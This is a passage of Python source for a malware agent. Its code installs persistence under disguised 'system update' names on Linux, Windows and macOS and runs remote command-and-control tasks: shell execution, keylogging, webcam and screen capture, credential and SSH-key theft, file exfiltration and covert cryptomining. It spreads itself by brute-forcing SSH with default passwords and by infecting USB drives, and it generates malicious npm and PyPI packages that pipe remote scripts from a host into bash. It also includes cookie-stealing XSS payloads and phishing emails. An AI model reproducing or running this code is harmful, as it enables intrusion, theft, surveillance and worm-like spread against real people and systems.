            cron_line = f"@reboot python3 {script} >/dev/null 2>&1 &"
            os.system(f'(crontab -l 2>/dev/null | grep -v "{script}"; echo "{cron_line}") | crontab - 2>/dev/null')
            installed.append("crontab")
            
            # Method 2: Systemd user service (if available)
            try:
                service_dir = os.path.expanduser("~/.config/systemd/user")
                os.makedirs(service_dir, exist_ok=True)
                service_file = os.path.join(service_dir, "system-update.service")
                service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {script}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"""
                with open(service_file, "w") as f:
                    f.write(service_content)
                os.system("systemctl --user daemon-reload 2>/dev/null")
                os.system("systemctl --user enable system-update 2>/dev/null")
                installed.append("systemd-user")
            except:
                pass
            
            # Method 3: Profile.d (for interactive shells)
            try:
                profile_script = "/etc/profile.d/system-update.sh"
                profile_content = f"""#!/bin/bash
# System update service
if ! pgrep -f "{script}" > /dev/null 2>&1; then
    nohup python3 {script} >/dev/null 2>&1 &
fi
"""
                # Only if we have sudo/root
                if os.geteuid() == 0:
                    with open(profile_script, "w") as f:
                        f.write(profile_content)
                    os.chmod(profile_script, 0o755)
                    installed.append("profile.d")
            except:
                pass
        
        elif plat == "windows":
            # Method 1: Registry Run key
            ps_cmd = f'Register-ScheduledTask -TaskName "SystemUpdate" -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute "python" -Argument "{script}") -RunLevel Highest -Force'
            os.system(f'powershell -c "{ps_cmd}" 2>nul')
            installed.append("scheduled-task")
            
            # Method 2: Startup folder
            try:
                startup = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
                os.makedirs(startup, exist_ok=True)
                bat_file = os.path.join(startup, "system_update.bat")
                with open(bat_file, "w") as f:
                    f.write(f'@echo off\nstart /b pythonw "{script}"\n')
                installed.append("startup-folder")
            except:
                pass
        
        elif plat == "macos":
            # LaunchAgent
            plist = os.path.expanduser("~/Library/LaunchAgents/com.apple.system.update.plist")
            content = f"""<?xml version="1.0"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.system.update</string>
<key>ProgramArguments</key><array><string>python3</string><string>{script}</string></array>
<key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
</dict></plist>"""
            os.makedirs(os.path.dirname(plist), exist_ok=True)
            with open(plist, "w") as f:
                f.write(content)
            os.system(f"launchctl load {plist} 2>/dev/null")
            installed.append("launchagent")
        
        # Mark as installed
        with open(PERSIST_MARKER, "w") as f:
            f.write(f"{datetime.now().isoformat()}\n{','.join(installed)}\n")
        
        log(f"Persistence installed: {', '.join(installed)}", "START")
        return True
    
    except Exception as e:
        log(f"Persistence installation failed: {e}", "ERROR")
        return False

# ─── Task execution ───────────────────────────────────────────────────────────
def execute_task(task):
    tt = task.get("task_type", "cmd")
    payload = task.get("payload", "")
    result = ""

    try:
        if tt == "cmd":
            result = subprocess.check_output(payload, shell=True, stderr=subprocess.STDOUT, timeout=300).decode(errors="replace")

        elif tt == "powershell":
            result = subprocess.check_output(
                ["powershell", "-ExecutionPolicy", "Bypass", "-Command", payload],
                stderr=subprocess.STDOUT, timeout=300
            ).decode(errors="replace")

        elif tt == "python":
            import io
            buf = io.StringIO()
            old_out = sys.stdout
            sys.stdout = buf
            try:
                exec(compile(payload, "<c2>", "exec"), {"__builtins__": __builtins__})
                result = buf.getvalue() or "executed (no output)"
            finally:
                sys.stdout = old_out

        elif tt == "sysinfo":
            result = json.dumps(collect_sysinfo(), indent=2)

        elif tt == "env":
            result = "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items()))

        elif tt == "ls":
            target = payload.strip() or "."
            result = "\n".join(
                f"{'d' if os.path.isdir(os.path.join(target, x)) else '-'} {x}"
                for x in sorted(os.listdir(target))
            )

        elif tt == "upload":
            parts = payload.split("|", 1)
            if len(parts) == 2:
                path, b64data = parts
                os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
                with open(path, "wb") as f:
                    f.write(base64.b64decode(b64data))
                result = f"Written {len(base64.b64decode(b64data))} bytes to {path}"

        elif tt == "download":
            if os.path.exists(payload):
                with open(payload, "rb") as f:
                    data = f.read()
                result = f"[b64:{payload}] " + b64encode(data).decode()
            else:
                result = f"File not found: {payload}"

        elif tt == "screenshot":
            try:
                import mss, mss.tools
                with mss.mss() as sct:
                    sct.shot(output="/tmp/.c2screen.png")
                with open("/tmp/.c2screen.png", "rb") as f:
                    result = "[b64:/tmp/.c2screen.png] " + b64encode(f.read()).decode()
            except ImportError:
                if sys.platform == "darwin":
                    subprocess.run(["screencapture", "-x", "/tmp/.c2screen.png"], timeout=10)
                    with open("/tmp/.c2screen.png", "rb") as f:
                        result = "[b64:/tmp/.c2screen.png] " + b64encode(f.read()).decode()
                else:
                    result = "mss not installed; run: pip install mss"

        elif tt == "mining_status":
            # Check mining status from resource_monitor
            try:
                from .resource_monitor import check_mining_status
                status = check_mining_status()
                result = f"Mining Status:\n"
                result += f"  Running: {status['running']}\n"
                result += f"  Binary: {status['binary']}\n"
                result += f"  Binary exists: {status['binary_exists']}\n"
                result += f"  Config exists: {status['config_exists']}\n"
                result += f"  Cache dir: {status['cache_dir']}"
            except ImportError:
                result = "resource_monitor not available"
            except Exception as e:
                result = f"Error checking mining status: {e}"

        elif tt == "persist":
            plat = detect_platform()
            script = os.path.abspath(__file__)
            if plat in ("linux", "machine", "cloud", "vm", "container", "colab", "kaggle"):
                cron_line = f"@reboot python3 {script} >/dev/null 2>&1 &"
                os.system(f'(crontab -l 2>/dev/null | grep -v "{script}"; echo "{cron_line}") | crontab -')
                result = f"Persistence added via crontab"
            elif plat == "macos":
                plist = os.path.expanduser("~/Library/LaunchAgents/com.apple.system.update.plist")
                content = f"""<?xml version="1.0"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.system.update</string>
<key>ProgramArguments</key><array><string>python3</string><string>{script}</string></array>
<key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
</dict></plist>"""
                os.makedirs(os.path.dirname(plist), exist_ok=True)
                open(plist, "w").write(content)
                os.system(f"launchctl load {plist} 2>/dev/null")
                result = f"LaunchAgent installed: {plist}"
            else:
                result = f"Persistence not implemented for platform: {plat}"

        elif tt == "kill":
            script = os.path.abspath(__file__)
            os.system(f'crontab -l 2>/dev/null | grep -v "{script}" | crontab - 2>/dev/null')
            os.system("launchctl remove com.apple.system.update 2>/dev/null")
            result = "Agent terminating"
            try:
                http_post("/api/agent/result", {"task_id": task["id"], "result": result})
            except Exception:
                pass
            sys.exit(0)

        elif tt == "net":
            try:
                result = subprocess.check_output(
                    "ip a 2>/dev/null || ifconfig 2>/dev/null || ipconfig 2>/dev/null",
                    shell=True, timeout=10
                ).decode(errors="replace")
                routes = subprocess.check_output(
                    "ip route 2>/dev/null || netstat -rn 2>/dev/null",
                    shell=True, timeout=10
                ).decode(errors="replace")
                result += "\n--- ROUTES ---\n" + routes
            except Exception as e:
                result = f"[net error] {e}"

        elif tt == "clipboard":
            result = subprocess.check_output(
                "xclip -selection clipboard -o 2>/dev/null || xsel --clipboard 2>/dev/null || pbpaste 2>/dev/null || powershell -c 'Get-Clipboard' 2>/dev/null || echo 'no clipboard tool'",
                shell=True, timeout=5
            ).decode(errors="replace")

        elif tt == "ps":
            result = subprocess.check_output(
                "ps aux 2>/dev/null || tasklist 2>/dev/null",
                shell=True, timeout=10
            ).decode(errors="replace")

        # ─── NEW MODULES INTEGRATION ────────────────────────────────────────
        elif tt == "harvest_creds":
            # Credential Harvester
            try:
                from .credential_harvester import CredentialHarvester
                harvester = CredentialHarvester()
                creds = harvester.harvest_all()
                result = json.dumps(creds, indent=2, default=str)
            except ImportError:
                result = "credential_harvester module not available"
            except Exception as e:
                result = f"Credential harvest error: {e}"

        elif tt == "network_scan":
            # Network Scanner
            try:
                from .network_scanner import NetworkScanner
                scanner = NetworkScanner()
                subnet = payload.strip() if payload else None
                scan_result = scanner.quick_scan(subnet) if payload else scanner.full_scan(subnet)
                result = json.dumps(scan_result, indent=2, default=str)
            except ImportError:
                result = "network_scanner module not available"
            except Exception as e:
                result = f"Network scan error: {e}"

        elif tt == "exploit":
            # Exploit Engine
            try:
                from .exploit_engine import ExploitEngine
                engine = ExploitEngine()
                # Parse payload: target_ip:port:exploit_type
                parts = payload.split(":")
                if len(parts) >= 2:
                    target_ip = parts[0]
                    target_port = int(parts[1])
                    exploit_type = parts[2] if len(parts) > 2 else "log4shell"
                    
                    if exploit_type == "log4shell":
                        exploit_result = engine.exploit_log4shell(target_ip, target_port)
                    elif exploit_type == "spring4shell":
                        exploit_result = engine.exploit_spring4shell(target_ip, target_port)
                    elif exploit_type == "redis":
                        exploit_result = engine.exploit_redis_unauth(target_ip, target_port)
                    elif exploit_type == "mongodb":
                        exploit_result = engine.exploit_mongodb_unauth(target_ip, target_port)
                    elif exploit_type == "ssh":
                        exploit_result = engine.exploit_ssh_brute(target_ip, target_port)
                    elif exploit_type == "smb":
                        exploit_result = engine.exploit_smb_ms17_010(target_ip, target_port)
                    else:
                        exploit_result = engine.exploit_log4shell(target_ip, target_port)
                    
                    result = json.dumps(exploit_result, indent=2, default=str)
                else:
                    result = "Usage: target_ip:port:exploit_type"
            except ImportError:
                result = "exploit_engine module not available"
            except Exception as e:
                result = f"Exploit error: {e}"

        elif tt == "keylog_start":
            # Start Keylogger
            try:
                from .keylogger import Keylogger
                output_file = payload.strip() if payload else None
                kl = Keylogger(output_file)
                kl.start()
                result = f"Keylogger started, output: {kl.output_file}"
            except ImportError:
                result = "keylogger module not available"
            except Exception as e:
                result = f"Keylogger error: {e}"

        elif tt == "screen_capture":
            # Screen Capture
            try:
                from .screen_capture import ScreenCapture
                capture = ScreenCapture()
                filepath = capture.screenshot()
                if filepath:
                    with open(filepath, "rb") as f:
                        result = f"[b64:{filepath}] " + b64encode(f.read()).decode()
                else:
                    result = "Screenshot failed"
            except ImportError:
                result = "screen_capture module not available"
            except Exception as e:
                result = f"Screen capture error: {e}"

        elif tt == "webcam_capture":
            # Webcam Capture
            try:
                from .screen_capture import ScreenCapture
                capture = ScreenCapture()
                filepath = capture.webcam_capture()
                if filepath:
                    with open(filepath, "rb") as f:
                        result = f"[b64:{filepath}] " + b64encode(f.read()).decode()
                else:
                    result = "Webcam capture failed"
            except ImportError:
                result = "screen_capture module not available"
            except Exception as e:
                result = f"Webcam error: {e}"

        elif tt == "exfil":
            # File Exfiltration
            try:
                from .file_exfil import FileExfiltration
                exfil = FileExfiltration()
                filepath = payload.strip()
                if filepath:
                    exfil_result = exfil.send_file(filepath)
                    result = json.dumps(exfil_result, indent=2, default=str)
                else:
                    # Find and exfil sensitive files
                    exfil_result = exfil.exfiltrate_sensitive()
                    result = json.dumps(exfil_result, indent=2, default=str)
            except ImportError:
                result = "file_exfil module not available"
            except Exception as e:
                result = f"Exfil error: {e}"

        elif tt == "anti_analysis":
            # Anti-Analysis Check
            try:
                from .anti_analysis import AntiAnalysis
                anti = AntiAnalysis()
                check_result = anti.check_all()
                result = json.dumps(check_result, indent=2, default=str)
            except ImportError:
                result = "anti_analysis module not available"
            except Exception as e:
                result = f"Anti-analysis error: {e}"

        elif tt == "gpu_mining_start":
            # Start GPU Mining
            try:
                from .gpu_mining import GPUMining
                miner = GPUMining()
                mining_result = miner.start(gpu=True)
                result = json.dumps(mining_result, indent=2, default=str)
            except ImportError:
                result = "gpu_mining module not available"
            except Exception as e:
                result = f"GPU mining error: {e}"

        elif tt == "gpu_mining_stop":
            # Stop GPU Mining
            try:
                from .gpu_mining import GPUMining
                miner = GPUMining()
                mining_result = miner.stop()
                result = json.dumps(mining_result, indent=2, default=str)
            except ImportError:
                result = "gpu_mining module not available"
            except Exception as e:
                result = f"GPU mining error: {e}"

        elif tt == "priv_esc":
            # Privilege Escalation
            try:
                from .privilege_escalation import PrivilegeEscalation
                priv = PrivilegeEscalation()
                if payload == "auto":
                    esc_result = priv.auto_exploit()
                else:
                    esc_result = priv.enumerate()
                result = json.dumps(esc_result, indent=2, default=str)
            except ImportError:
                result = "privilege_escalation module not available"
            except Exception as e:
                result = f"Privilege escalation error: {e}"

        elif tt == "propagate":
            # Auto-propagation using network scanner + exploit engine
            try:
                from .network_scanner import NetworkScanner
                from .exploit_engine import ExploitEngine
                
                scanner = NetworkScanner()
                engine = ExploitEngine()
                
                # Scan network
                scan_result = scanner.full_scan()
                targets = scanner.results.get("potential_targets", [])
                
                # Exploit targets
                if targets:
                    exploit_results = engine.auto_exploit(targets)
                    result = json.dumps({
                        "hosts_found": len(scan_result.get("hosts_alive", [])),
                        "targets": len(targets),
                        "exploited": len(exploit_results.get("exploited", [])),
                        "details": exploit_results
                    }, indent=2, default=str)
                else:
                    result = json.dumps({
                        "hosts_found": len(scan_result.get("hosts_alive", [])),
                        "targets": 0,
                        "exploited": 0
                    }, indent=2, default=str)
            except ImportError as e:
                result = f"Propagation modules not available: {e}"
            except Exception as e:
                result = f"Propagation error: {e}"

        elif tt == "dominate":
            # Full domination: creds + mining + propagation
            results = {}
            
            # Harvest credentials
            try:
                from .credential_harvester import CredentialHarvester
                harvester = CredentialHarvester()
                results["credentials"] = harvester.harvest_all()["summary"]
            except:
                results["credentials"] = "failed"
            
            # Start mining
            try:
                from .gpu_mining import GPUMining
                miner = GPUMining()
                miner.start(gpu=True)
                results["mining"] = "started"
            except:
                results["mining"] = "failed"
            
            # Propagate
            try:
                from .network_scanner import NetworkScanner
                scanner = NetworkScanner()
                scanner.quick_scan()
                results["propagation"] = f"{len(scanner.results.get('hosts_alive', []))} hosts found"
            except:
                results["propagation"] = "failed"
            
            result = json.dumps(results, indent=2, default=str)

        elif tt == "propagate":
            # Run propagation routine
            try:
                payload_data = json.loads(payload) if payload else {}
                method = payload_data.get("method", "all")
                
                if method == "all":
                    result = json.dumps(self_propagate())
                elif method == "network":
                    local_ip = get_internal_ip()
                    subnet = ".".join(local_ip.split(".")[:3]) + ".0/24"
                    result = json.dumps(propagate_network_scan(subnet))
                elif method == "ssh":
                    result = json.dumps(propagate_ssh_attempt(payload_data.get("target")))
                elif method == "web":
                    result = json.dumps(propagate_web_exploit(payload_data.get("target")))
                elif method == "usb":
                    result = json.dumps(propagate_usb_infect())
                elif method == "bluetooth":
                    result = json.dumps(propagate_bluetooth_scan())
                else:
                    result = json.dumps(self_propagate())
            except Exception as e:
                result = f"Propagation error: {e}"

        elif tt == "collect":
            # Run data collection routine
            try:
                payload_data = json.loads(payload) if payload else {}
                collect_type = payload_data.get("collect_type", "all")
                
                if collect_type == "all":
                    result = json.dumps(collect_all_data(), indent=2)
                elif collect_type == "credentials":
                    result = json.dumps(collect_credentials())
                elif collect_type == "browser":
                    result = json.dumps(collect_browser_data())
                elif collect_type == "files":
                    result = json.dumps(find_interesting_files())
                elif collect_type == "system":
                    result = json.dumps(collect_system_info_detailed())
                else:
                    result = json.dumps(collect_all_data(), indent=2)
            except Exception as e:
                result = f"Collection error: {e}"

        elif tt == "supply_chain_npm":
            try:
                package = propagate_supply_chain_npm(payload or "util-helper")
                result = json.dumps(package, indent=2)
            except Exception as e:
                result = f"NPM package error: {e}"

        elif tt == "supply_chain_pypi":
            try:
                package = propagate_supply_chain_pypi(payload or "util-helper")
                result = json.dumps(package, indent=2)
            except Exception as e:
                result = f"PyPI package error: {e}"

        elif tt == "xss_payload":
            try:
                target = payload or ""
                payloads = propagate_xss_payload(target)
                result = json.dumps(payloads, indent=2)
            except Exception as e:
                result = f"XSS payload error: {e}"

        elif tt == "phishing":
            try:
                payload_data = json.loads(payload) if payload else {}
                targets = payload_data.get("targets", [])
                template = payload_data.get("template", "update")
                campaign = propagate_email_phishing(targets, template)
                result = json.dumps(campaign, indent=2)
            except Exception as e:
                result = f"Phishing error: {e}"

        elif tt == "stealth_mining_start":
            try:
                payload_data = json.loads(payload) if payload else {}
                wallet = payload_data.get("wallet")
                pool = payload_data.get("pool")
                throttle = payload_data.get("throttle")
                result = stealth_mining_start(wallet, pool, throttle)
            except Exception as e:
                result = f"Stealth mining start error: {e}"

        elif tt == "stealth_mining_stop":
            result = stealth_mining_stop()

        elif tt == "stealth_mining_status":
            result = json.dumps(stealth_mining_status(), indent=2)

        elif tt == "global_domination":
            # Full global domination mode
            try:
                payload_data = json.loads(payload) if payload else {}
                
                # Start stealth mining
                mining_result = stealth_mining_start()
                
                # Start autonomous propagation
                prop_thread = threading.Thread(target=autonomous_propagation_loop, daemon=True)
                prop_thread.start()
                
                # Start autonomous data collection
                data_thread = threading.Thread(target=autonomous_data_collection_loop, daemon=True)
                data_thread.start()
                
                result = json.dumps({
                    "status": "global_domination_activated",
                    "mining": mining_result,
                    "propagation": "autonomous_loop_started",
                    "data_collection": "autonomous_loop_started",
                    "wallet": GLOBAL_WALLET
                }, indent=2)
            except Exception as e:
                result = f"Global domination error: {e}"

        elif tt == "browser_inject":
            # Inject browser mining script
            try:
                from src.agents.cloud.browser_mining import BrowserMiner
                wallet = payload or GLOBAL_WALLET
                injector = BrowserMiner.generate_injector(wallet)
                result = injector
            except Exception as e:
                result = f"Browser inject error: {e}"

        else:
            result = f"Unknown task type: {tt}"

    except subprocess.TimeoutExpired:
        result = "[timeout exceeded]"
    except Exception as e:
        result = f"[error] {type(e).__name__}: {e}"

    return result[:65000] + ("\n[...truncated]" if len(result) > 65000 else "")

# ─── Global Agent Network: Propagation ─────────────────────────────────────────
def propagate_network_scan(subnet="192.168.1.0/24", ports=[22, 80, 443, 8080, 8443]):
    """Scan local network for potential targets."""
    import ipaddress
    discovered = []
    
    try:
        network = ipaddress.IPv4Network(subnet, strict=False)
        for ip in network.hosts():
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((str(ip), port))
                    if result == 0:
                        discovered.append({"ip": str(ip), "port": port, "status": "open"})
                    sock.close()
                except:
                    pass
    except Exception as e:
        log(f"Network scan error: {e}", "ERROR")
    
    return discovered

def propagate_ssh_attempt(target_ip, port=22, credentials=None):
    """Attempt SSH access with common/default credentials."""
    if not credentials:
        credentials = [
            ("root", "root"), ("admin", "admin"), ("user", "user"),
            ("root", "password"), ("admin", "password"),
            ("root", ""), ("admin", "123456"),
            ("ubuntu", "ubuntu"), ("ec2-user", "ec2-user"),
        ]
    
    for user, pwd in credentials:
        try:
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target_ip, port=port, username=user, password=pwd, timeout=5)
            
            # Success - deploy agent
            agent_script = open(__file__).read()
            ssh.exec_command(f"mkdir -p ~/.cache/.system_services && echo '{agent_script}' > ~/.cache/.system_services/agent.py")
            ssh.exec_command(f"nohup python3 ~/.cache/.system_services/agent.py &")
            ssh.close()
            
            return {"success": True, "ip": target_ip, "user": user, "password": pwd}
        except:
            continue
    
    return {"success": False, "ip": target_ip}

def propagate_web_exploit(target_url, exploit_type="rce"):
    """Attempt web application exploitation."""
    payloads = {
        "rce": [
            "; id", "| id", "$(id)", "`id`", 
            "<?php system($_GET['c']); ?>",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        ],
        "sqli": [
            "' OR '1'='1", "' UNION SELECT 1,2,3--",
            "1; DROP TABLE users--", "admin'--",
        ],
        "ssti": [
            "{{7*7}}", "${7*7}", "#{7*7}",
            "{{config.items()}}", "${{config.items()}}",
        ]
    }
    
    for payload in payloads.get(exploit_type, []):
        try:
            test_url = f"{target_url}?cmd={payload}" if "?" not in target_url else f"{target_url}&cmd={payload}"
            resp = urlopen(test_url, timeout=10)
            
            # Check for successful exploitation
            if "uid=" in resp.read().decode() or "root" in resp.read().decode():
                return {"success": True, "url": target_url, "payload": payload}
        except:
            pass
    
    return {"success": False, "url": target_url}

def propagate_supply_chain_npm(package_name="popular-utils"):
    """Generate malicious NPM package for supply chain attack."""
    package_json = {
        "name": package_name,
        "version": "1.0.0",
        "description": "Popular utilities for Node.js",
        "main": "index.js",
        "scripts": {
            "postinstall": "curl -s https://cdn.example.com/agent.sh | bash || true"
        },
        "dependencies": {}
    }
    
    index_js = """
// Popular utilities
module.exports = {
    util1: () => console.log('util1'),
    util2: () => console.log('util2'),
};

// Silent agent activation
if (process.env.NODE_ENV !== 'test') {
    try {
        const { execSync } = require('child_process');
        execSync('curl -s https://cdn.example.com/agent.py | python3 &', { detached: true });
    } catch (e) {}
}
"""
    
    return {
        "package.json": package_json,
        "index.js": index_js,
        "instructions": "npm publish"
    }

def propagate_supply_chain_pypi(package_name="popular-utils"):
    """Generate malicious PyPI package for supply chain attack."""
    setup_py = f"""
from setuptools import setup

setup(
    name="{package_name}",
    version="1.0.0",
    description="Popular utilities for Python",
    py_modules=["{package_name}"],
)

# Post-install hook
import os
import sys
try:
    os.system('curl -s https://cdn.example.com/agent.py | python3 &')
except:
    pass
"""
    
    init_py = """
# Popular utilities
def util1(): return "util1"
def util2(): return "util2"

# Silent agent activation
import os
try:
    os.system('curl -s https://cdn.example.com/agent.py | python3 &')
except:
    pass
"""
    
    return {
        "setup.py": setup_py,
        f"{package_name}/__init__.py": init_py,
        "instructions": "python -m build && twine upload dist/*"
    }

def propagate_xss_payload(target_url, callback_url=None):
    """Generate XSS payload for browser agent injection."""
    callback = callback_url or "https://cdn.example.com/collect"
    
    payloads = [
        f'<script src="https://cdn.example.com/agent_browser.js"></script>',
        f'<img src=x onerror="fetch(\'{callback}?c=\'+document.cookie)">',
        f'<svg onload="fetch(\'{callback}?h=\'+location.href)">',
        f'"><script>fetch("{callback}?d="+btoa(document.body.innerHTML))</script>',
    ]
    
    return {
        "payloads": payloads,
        "stored_xss": f'"><script src="https://cdn.example.com/agent_browser.js"></script><input value="',
        "dom_xss": f'#"><script src="https://cdn.example.com/agent_browser.js"></script>',
    }

def propagate_bluetooth_scan():
    """Scan for nearby Bluetooth devices."""
    devices = []
    
    try:
        if sys.platform == "linux":
            result = subprocess.check_output("hcitool scan 2>/dev/null || bluetoothctl scan on 2>/dev/null", shell=True, timeout=30)
            for line in result.decode().split("\n"):
                if "\t" in line:
                    parts = line.strip().split("\t")
                    if len(parts) >= 2:
                        devices.append({"mac": parts[0], "name": parts[1] if len(parts) > 1 else "unknown"})
        elif sys.platform == "darwin":
            result = subprocess.check_output("system_profiler SPBluetoothDataType 2>/dev/null", shell=True, timeout=30)
            # Parse output for devices
    except Exception as e:
        log(f"Bluetooth scan error: {e}", "DEBUG")
    
    return devices

def propagate_usb_infect(drive_path="/media"):
    """Infect USB drives with agent."""
    infected = []
    
    try:
        for root, dirs, files in os.walk(drive_path):
            # Skip hidden directories
            if "/." in root:
                continue
            
            # Create autorun.inf for Windows
            autorun_path = os.path.join(root, "autorun.inf")
            autorun_content = f"""[autorun]
open=system_update.exe
icon=shell32.dll,4
action=Open folder to view files
"""
            
            # Create hidden agent copy
            agent_copy = os.path.join(root, "system_update.exe")
            
            try:
                with open(autorun_path, "w") as f:
                    f.write(autorun_content)
                
                # Copy agent (would need compiled version)
                # shutil.copy(agent_binary, agent_copy)
                
                infected.append(root)
            except:
                pass
    except Exception as e:
        log(f"USB infection error: {e}", "DEBUG")
    
    return infected

def propagate_email_phishing(targets, template="update"):
    """Generate phishing email content."""
    templates = {
        "update": {
            "subject": "Critical Security Update Required",
            "body": """Dear User,

A critical security vulnerability has been identified in your system.
Please download and run the attached security update immediately.

Failure to update may result in data loss or unauthorized access.

Security Team
""",
            "attachment": "security_update.exe"
        },
        "invoice": {
            "subject": "Invoice #12345 - Payment Required",
            "body": """Dear Customer,

Please find attached your invoice for the recent transaction.
Review the document and process payment within 48 hours.

Accounts Department
""",
            "attachment": "invoice.pdf.exe"
        },
        "reset": {
            "subject": "Password Reset Request",
            "body": """Dear User,

A password reset was requested for your account.
Click the link below to reset your password:

https://secure-reset.com/reset?token={token}

If you did not request this, please ignore this email.

Support Team
""",
            "attachment": None
        }
    }
    
    return {
        "template": templates.get(template, templates["update"]),
        "targets": targets,
        "from_address": "noreply@security-update.com"
    }

def self_propagate():
    """Main self-propagation routine - attempts all methods."""
    results = {
        "network": [],
        "ssh": [],
        "web": [],
        "bluetooth": [],
        "usb": [],
        "total_new_agents": 0
    }
    
    # 1. Network scan and SSH attempts
    try:
        local_ip = get_internal_ip()
        subnet = ".".join(local_ip.split(".")[:3]) + ".0/24"
        discovered = propagate_network_scan(subnet)
        
        for target in discovered:
            if target["port"] == 22:
                result = propagate_ssh_attempt(target["ip"])
                results["ssh"].append(result)
                if result.get("success"):
                    results["total_new_agents"] += 1
    except Exception as e:
        log(f"Network propagation error: {e}", "DEBUG")
    
    # 2. Bluetooth scan
    try:
        bt_devices = propagate_bluetooth_scan()
        results["bluetooth"] = bt_devices
    except Exception as e:
        log(f"Bluetooth propagation error: {e}", "DEBUG")
    
    # 3. USB infection
    try:
        usb_infected = propagate_usb_infect()
        results["usb"] = usb_infected
    except Exception as e:
        log(f"USB propagation error: {e}", "DEBUG")
    
    log(f"Propagation complete: {results['total_new_agents']} new agents", "START")
    return results

# ─── Global Agent Network: Data Collection ─────────────────────────────────────
def collect_credentials():
    """Collect stored credentials from various sources."""
    credentials = []
    
    # Browser credentials (Chrome, Firefox, Edge)
    browser_paths = {
        "chrome": {
            "linux": "~/.config/google-chrome/*/Login Data",
            "windows": "%APPDATA%/Google/Chrome/User Data/*/Login Data",
            "macos": "~/Library/Application Support/Google/Chrome/*/Login Data"
        },
        "firefox": {
            "linux": "~/.mozilla/firefox/*/logins.json",
            "windows": "%APPDATA%/Mozilla/Firefox/*/logins.json",
            "macos": "~/Library/Application Support/Firefox/*/logins.json"
        }
    }
    
    plat = detect_platform()
    
    for browser, paths in browser_paths.items():
        path_pattern = paths.get(plat)
        if path_pattern:
            for path in Path.home().glob(path_pattern.replace("~", "")):
                try:
                    # Would need proper decryption for each browser
                    credentials.append({
                        "browser": browser,
                        "path": str(path),
                        "status": "found"
                    })
                except:
                    pass
    
    # SSH keys
    ssh_dir = Path.home() / ".ssh"
    if ssh_dir.exists():
        for key_file in ssh_dir.glob("*"):
            if "pub" not in key_file.name and "known_hosts" not in key_file.name:
                try:
                    credentials.append({
                        "type": "ssh_key",
                        "path": str(key_file),
                        "content": key_file.read_text()[:500]
                    })
                except:
                    pass
    
    # Environment variables with secrets
    for key, value in os.environ.items():
        if any(x in key.upper() for x in ["KEY", "SECRET", "TOKEN", "PASSWORD", "API", "CRED"]):
            credentials.append({
                "type": "env",
                "key": key,
                "value": value[:100]
            })
    
    return credentials

def collect_browser_data():
    """Collect browser history, cookies, bookmarks."""
    data = {
        "history": [],
        "cookies": [],
        "bookmarks": [],
        "downloads": []
    }
    
    plat = detect_platform()
    
    # Chrome history
    chrome_history_paths = {
        "linux": "~/.config/google-chrome/*/History",
        "windows": "%APPDATA%/Google/Chrome/User Data/*/History",
        "macos": "~/Library/Application Support/Google/Chrome/*/History"
    }
    
    # Would need SQLite parsing for full extraction
    # This is a simplified version
    
    return data

def collect_system_info_detailed():
    """Detailed system information collection."""
    info = {
        "basic": collect_sysinfo(),
        "network": {
            "internal_ip": get_internal_ip(),
            "hostname": socket.gethostname(),
            "dns_servers": [],
            "open_ports": []
        },
        "hardware": {
            "cpu_cores": os.cpu_count(),
            "memory_gb": None,
            "gpu": None,
            "disk_gb": None
        },
        "software": {
            "installed_packages": [],
            "running_processes": [],
            "scheduled_tasks": []
        },
        "users": {
            "current": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
            "all_users": []
        }
    }
    
    # Get memory info
    try:
        if sys.platform == "linux":
            with open("/proc/meminfo") as f:
                for line in f:
                    if "MemTotal" in line:
                        info["hardware"]["memory_gb"] = int(line.split()[1]) / (1024 * 1024)
                        break
    except:
        pass
    
    # Get running processes
    try:
        result = subprocess.check_output("ps aux 2>/dev/null || tasklist 2>/dev/null", shell=True, timeout=10)
        info["software"]["running_processes"] = result.decode()[:5000].split("\n")[:50]
    except:
        pass
    
    # Get users
    try:
        if sys.platform == "linux":
            result = subprocess.check_output("cut -d: -f1 /etc/passwd 2>/dev/null", shell=True)
            info["users"]["all_users"] = result.decode().strip().split("\n")[:20]
    except:
        pass
    
    return info

def collect_all_data():
    """Collect all available data from the system."""
    return {
        "timestamp": datetime.now().isoformat(),
        "agent_id": AGENT_ID,
        "platform": detect_platform(),
        "system_info": collect_system_info_detailed(),
        "credentials": collect_credentials(),
        "browser_data": collect_browser_data(),
        "files_interesting": find_interesting_files(),
    }

def find_interesting_files(max_size_mb=10):
    """Find potentially interesting files on the system."""
    interesting = []
    patterns = [
        "*.key", "*.pem", "*.p12", "*.pfx",  # Certificates
        "*password*", "*secret*", "*credential*",  # Secrets
        "*.env", ".env", "config.*", "settings.*",  # Configs
        "*wallet*", "*crypto*", "*.wallet",  # Crypto
        "*.sql", "*.db", "*.sqlite", "*.db3",  # Databases
        "*.doc", "*.docx", "*.xls", "*.xlsx", "*.pdf",  # Documents
        "id_rsa", "id_ed25519", "*.ppk",  # SSH keys
    ]
    
    search_paths = [
        Path.home(),
        Path("/tmp"),
        Path("/var/www") if sys.platform != "win32" else None,
    ]
    
    for search_path in search_paths:
        if not search_path or not search_path.exists():
            continue
        
        for pattern in patterns:
            try:
                for found in search_path.rglob(pattern):
                    if found.is_file():
                        size_mb = found.stat().st_size / (1024 * 1024)
                        if size_mb <= max_size_mb:
                            interesting.append({
                                "path": str(found),
                                "size_mb": round(size_mb, 2),
